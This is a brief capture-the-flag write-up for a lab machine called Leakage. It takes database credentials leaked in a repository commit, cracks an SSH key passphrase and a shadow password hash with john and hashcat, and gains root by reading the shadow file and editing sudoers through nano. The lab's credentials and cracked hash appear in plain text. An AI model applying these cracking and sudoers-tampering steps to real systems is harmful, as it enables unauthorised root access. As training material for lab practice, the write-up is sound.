# CyberSecLabs: Leakage


http://172.31.1.6/jonathan/CMS/-/commit/e2e3115dd0ea56b0b6dd8f919b258fc1b849776e

config.php commit:

```
define('URL_ADMIN',PROTOCOL.'doorgets.prod:8888/');
define('URL_USER',PROTOCOL.'doorgets.prod:8888/dg-user/');
define('SQL_HOST','localhost');
define('SQL_LOGIN','root');
define('SQL_PWD','root');
define('SQL_LOGIN','jonathan');
define('SQL_PWD','rPHAKWAgMZtjr9at');
define('SQL_DB','doorgets-prod01');
define('SQL_VERSION','5.5.42');
require_once CONFIGURATION.'includes.php';
```
Login with this cred:
```
jonathan:rPHAKWAgMZtjr9at
```

After logging in visit ```http://172.31.1.6/jonathan/security```



```zsh
 python /usr/share/john/ssh2john.py id_rsa  > idrsa
```
```zsh
john idrsa --wordlist /usr/share/wordlists/rockyou.txt
```
```
Press 'q' or Ctrl-C to abort, almost any other key for status                                                      
scooby           (id_rsa) 
```

Run winpeas
/bin/nano -- red and yellow. Hence 99 percent PE vector.

```zsh
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt --force
```
Cracked hash
```
$6$yMsg6cpK$q52od6Zj/FhqmmsuVZ7pKvGJ2o2R/kieZ3SQ/QWWbdn2eVFCTewYvjKBd2P4jfsh9IYwelJoPevGpQCsA2NT61:chocolate
```

su root
enter pass

*Alternate way*

Or you can edit ```/etc/sudoers/```

```
# User privilege specification
root    ALL=(ALL:ALL) ALL
jonathan ALL=(ALL:ALL) NOPASSWD: ALL
# Members of the admin group may gain root privileges
%admin ALL=(ALL) NOPASSWD: ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) NOPASSWD: ALL
```
exit the ssh, relogin and just do ```sudo /bin/bash```



